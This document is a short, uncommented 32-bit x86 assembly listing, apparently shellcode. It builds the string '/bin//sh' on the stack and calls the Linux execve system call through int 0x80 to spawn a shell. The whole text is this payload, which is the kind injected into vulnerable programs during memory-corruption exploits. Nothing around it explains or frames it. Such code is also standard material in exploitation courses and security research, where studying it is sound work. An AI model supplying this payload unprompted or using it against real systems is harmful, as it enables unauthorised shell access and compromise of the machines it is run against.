bits 32

xor eax, eax
push eax
push '//sh'
push '/bin'
mov ebx, esp
mov ecx, eax
mov edx, eax
push byte 11
pop eax
int 0x80
